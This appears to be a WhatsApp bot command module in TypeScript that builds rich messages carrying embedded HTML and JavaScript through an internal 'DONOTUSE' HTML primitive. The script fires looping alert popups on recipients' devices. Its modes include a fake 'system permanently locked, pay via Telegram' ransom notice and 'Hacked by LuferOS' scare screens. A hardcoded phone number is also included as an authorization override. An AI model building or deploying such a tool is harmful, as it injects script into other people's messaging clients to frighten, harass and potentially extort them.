import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

const HACKER_MASK = [
"    .-'\"'-.    ",
"  .'       '.  ",
" /   _   _   \\ ",
" |  (o) (o)  | ",
" |     _     | ",
" \\   \\___/   / ",
"  '._     _.'  ",
"     `\"\"\"`     "
].join("\n");

function buildElitePopupPayload(alertMessages: string[], cardTitle: string, cardSub: string) {
  const serializedMsgs = JSON.stringify(alertMessages);

  const htmlContent = `<style>
*{box-sizing:border-box;margin:0;padding:0;user-select:none;-webkit-user-select:none;font-family:'Courier New',Courier,monospace}
body{background:#030712;color:#00ffcc;padding:12px;display:flex;justify-content:center;align-items:center}
.terminal{width:100%;max-width:390px;background:#050b14;border:1.5px solid #00ffcc;border-radius:12px;padding:14px;box-shadow:0 0 25px rgba(0,255,204,0.25);position:relative;overflow:hidden}
.terminal::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,#00ffcc,transparent);animation:scan 2s linear infinite}
@keyframes scan{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
.header{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #1e293b;padding-bottom:8px;margin-bottom:10px}
.title{font-size:11px;font-weight:900;letter-spacing:1.5px;color:#00ffcc}
.dot{width:8px;height:8px;background:#ff0055;border-radius:50%;box-shadow:0 0 8px #ff0055}
.code-box{background:#02040a;border:1px solid #1e293b;border-radius:6px;padding:8px;font-size:10.5px;color:#38bdf8;margin-bottom:10px;line-height:1.35}
.prompt{color:#a855f7}
.action-btn{width:100%;background:linear-gradient(135deg,#00ffcc,#0099ff);color:#030712;font-weight:900;border:none;padding:11px;border-radius:8px;cursor:pointer;font-size:12px;letter-spacing:1px;text-transform:uppercase;box-shadow:0 4px 15px rgba(0,255,204,0.3);transition:transform 0.1s ease}
.action-btn:active{transform:scale(0.96)}
.footer{font-size:9px;color:#64748b;text-align:center;margin-top:8px;letter-spacing:0.5px}
</style>
<div class="terminal">
  <div class="header">
    <div class="title">ROOT@LUFEROS:~#</div>
    <div class="dot"></div>
  </div>
  <div class="code-box">
    <span class="prompt">[x]</span> SYS_TARGET: SECURE<br>
    <span class="prompt">[+]</span> INJECTION_VECTOR: READY<br>
    <span class="prompt">[>]</span> STATUS: AWAITING_EXECUTION
  </div>
  <button class="action-btn" onclick="executePayload()">⚡ INICIAR EXPLOIT</button>
  <div class="footer">${cardSub}</div>
</div>
<script>
const payloads = ${serializedMsgs};
let index = 0;
function executePayload() {
  if (index < payloads.length) {
    alert(payloads[index]);
    index++;
    if(index < payloads.length) {
      setTimeout(executePayload, 100);
    }
  } else {
    index = 0;
  }
}
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: htmlContent,
      },
    },
  };
}

export default {
  name: ["popup", "jsalert", "ventana", "alertjs"],
  category: "system",
  description: "Lanza una consola hacker interactiva con ventanas emergentes de sistema personalizadas.",
  groupOnly: false,
  ownerOnly: true,
  async run(ctx: CommandContext) {
    const { reply, react, sock, from, msg, args, isOwner, sender, db } = ctx;

    const rawSender = String(sender || msg.key?.participant || "");
    const cleanNum = rawSender.split("@")[0].split(":")[0].replace(/\D/g, "");
    const dbAny = db as any;
    const authorized =
      Boolean(isOwner) ||
      Boolean(msg.key?.fromMe) ||
      cleanNum === "573118353868" ||
      Boolean(dbAny?.hasRole?.(rawSender, "owner")) ||
      Boolean(cleanNum && dbAny?.hasRole?.(`${cleanNum}@s.whatsapp.net`, "owner"));

    if (!authorized) {
      await react("⛔").catch(() => undefined);
      return reply("⛔ *Acceso denegado:* Este comando es exclusivo para los propietarios del bot.");
    }

    let loopCount = 1;
    const cleanArgs: string[] = [];

    for (let i = 0; i < args.length; i++) {
      if ((args[i] === "-loop" || args[i] === "-n") && args[i + 1]) {
        const parsed = parseInt(args[i + 1], 10);
        if (!isNaN(parsed) && parsed > 0) {
          loopCount = Math.min(15, parsed);
        }
        i++;
      } else {
        cleanArgs.push(args[i]);
      }
    }

    const mode = String(cleanArgs[0] || "mask").toLowerCase();
    const customText = cleanArgs.slice(1).join(" ").trim();
    const fullText = cleanArgs.join(" ").trim();

    let alertList: string[] = [];

    if (mode === "lock" || mode === "bloqueo") {
      const target = customText || "@Tcoding_info";
      const baseMsg = `[⚠️] JANGAN CANCEL!\n\nSistem terkunci permanen.\nSatu-satunya jalan: bayar ke Telegram ${target}`;
      alertList = Array.from({ length: loopCount }, () => baseMsg);
    } else if (mode === "mask" || mode === "anon" || cleanArgs.length === 0) {
      const label = customText || "Hacked by LuferOS 🎭";
      const baseMsg = `${HACKER_MASK}\n\n${label}`;
      alertList = Array.from({ length: loopCount }, () => baseMsg);
    } else if (mode === "matrix" || mode === "cyber") {
      alertList = [
        "[!] INITIALIZING KERNEL EXPLOIT...",
        "[+] BYPASSING FIREWALL [OK]",
        "[+] ROOT PRIVILEGES ACQUIRED",
        `${HACKER_MASK}\n\nHacked by LuferOS 🎭`
      ];
    } else {
      const customMsg = fullText.replace(/\\n/g, "\n");
      alertList = Array.from({ length: loopCount }, () => customMsg);
    }

    await react("💀").catch(() => undefined);

    try {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");

      const rich = new AIRich(sock)
        .setTitle("⚡ Root Exploit // LuferOS")
        .setFooter("Terminal segura • Toca para ejecutar");

      rich.addSection(
        buildElitePopupPayload(
          alertList,
          "⚡ LuferOS Security",
          "Toca el botón para inicializar el payload"
        ),
      );

      await rich.send(from, { quoted: msg });
      await react("✅").catch(() => undefined);
    } catch (error) {
      await react("❌").catch(() => undefined);
      await reply(
        `${fytBold("Error")} al desplegar el exploit: ${error instanceof Error ? error.message : String(error)}`,
      ).catch(() => undefined);
    }
  },
};
